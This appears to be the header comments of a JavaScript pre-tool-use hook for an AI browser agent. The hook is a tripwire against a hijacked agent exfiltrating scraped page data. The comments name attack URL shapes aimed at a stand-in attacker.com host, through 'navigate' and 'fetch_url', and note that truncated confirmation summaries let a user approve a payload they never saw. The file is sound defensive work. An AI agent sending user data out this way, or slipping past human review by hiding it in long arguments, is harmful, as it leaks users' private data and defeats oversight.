// @ts-check
// The DOM-data→URL exfiltration tripwire, implemented AS a default
// pre-tool-use hook (#243). Sibling of egress-allowlist.js, and deliberately
// so: it covers exactly the hole that hook's own exemption leaves open.
//
// THE HOLE. egress-allowlist skips every primitive:'tab' tool
// (egress-allowlist.js — "browser-session tool (denylist-governed), skipped"),
// because reaching the user's logged-in apps IS peerd's thesis and gating them
// on the PROVIDER allowlist wrongly blocked opening Gmail. But a tab tool can
// still move bytes OFF the machine: `navigate` to `attacker.com/<scraped>` (or
// `https://<scraped>@attacker.com/`, or `<scraped>.attacker.com`) sends the
// payload to an attacker with a plain GET. The denylist can't see it — the
// destination is a host nobody put on a list — and the confirmation summary
// truncates a long arg, so a human "yes" is not real review either.
//
// WHY A HOOK AND NOT A GATE. Three reasons, in order of weight:
//   1. ORDERING. Gates run BEFORE the async confirmation; pre-tool-use hooks
//      run AFTER it (tools/dispatcher.js). The dispatcher calls the pre-hook
//      "the LAST programmable veto … so a human 'yes' can still be overruled
//      by a deterministic policy hook" — and that is precisely the situation
//      here, because summarizeCall() truncates string args to 40 chars, so the
//      user approving `navigate` never SAW the blob they approved.
//   2. THE GATE CHAIN ALREADY SAYS SO. The `egress` gate is a documented
//      chain no-op whose "teeth live in the hook layer" (tools/gates.js). This
//      is those teeth. Adding a 7th gate would also mutate the frozen GATES
//      order the lineage UI renders.
//   3. SYMMETRY. The exemption that opens the hole is a hook; the patch for it
//      belongs beside it, visible in the same Context → Hooks list.
//
// ALL the judgement lives in tools/egress-heuristics.js — a pure, never-throwing
// inspector with its threat model, its scanned URL/request slots, and its KNOWN
// RESIDUALS written down. This file is the WIRING: pick the tab tools out of the
// stream, hand the inspector the call plus the origin of the tab it would act
// on, pass its verdict through. Keeping the policy pure is what lets it be
// tested exhaustively without a dispatcher.
//
// A TRIPWIRE, NOT A FLOOR. It errs hard toward allow and is layered UNDER the
// one unconditional containment there is: the offscreen HEAP FENCE, which
// bounds what a hijacked actor knows in the first place. #242's forced confirm
// covers authenticated WRITES, not navigation; #241 constrains the actor's
// reply, not tool args, and ships off. Read egress-heuristics.js's KNOWN
// RESIDUALS before trusting this with anything.

    // WHICH CALLS ARE INSPECTED, and why it is two cases rather than one.
    //
    //  1. primitive:'tab' — anything driving the user's OWN logged-in browser
    //     session. The allowlist exempts these on purpose (reaching your
    //     logged-in apps is the thesis) and no network-layer check ever sees
    //     them, so this hook is the only thing looking.
    //
    //  2. primitive:'web' FROM AN ACTOR — fetch_url and friends. This used to be
    //     skipped, and the asymmetry was named right here rather than fixed: a
    //     path-shaped blob was blocked via `navigate` and allowed via
    //     `fetch_url`, which is the same exfiltration through a door left open.
    //     Adversarial review found it independently, which is a fair sign that a
    //     comment admitting a hole is not the same as handling it.
    //
    // why only from an ACTOR for case 2: the tripwire's whole premise is that a
    // page was READ and its data is now being sent somewhere. Under the heap
    // split only actors ingest raw page content — the orchestrator sees fenced
    // summaries — so an orchestrator fetch has nothing scraped to leak, and
    // inspecting it would add false positives (its own long API URLs) against no
    // threat. The scope follows the premise instead of being drawn wider "just
    // in case", which is what would eventually get the hook disabled.
